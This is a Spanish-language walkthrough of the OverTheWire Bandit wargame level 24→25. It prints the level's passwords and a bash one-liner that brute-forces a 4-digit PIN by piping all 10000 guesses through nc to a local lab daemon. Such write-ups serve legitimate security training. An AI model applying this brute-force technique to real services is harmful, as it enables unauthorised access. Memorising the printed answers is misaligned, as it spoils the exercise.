### Objetivo
Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le da la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN excepto revisando todas las 10000 combinaciones, lo que se denomina fuerza bruta.
No es necesario crear nuevas conexiones cada vez.
### Datos de acceso
- Puerto: 2220
- Dirección: bandit.labs.overthewire.org
- Contraseña: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
- Usuario: bandit24
### Solución

```bash
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```

### Notas adicionales


### Referencias
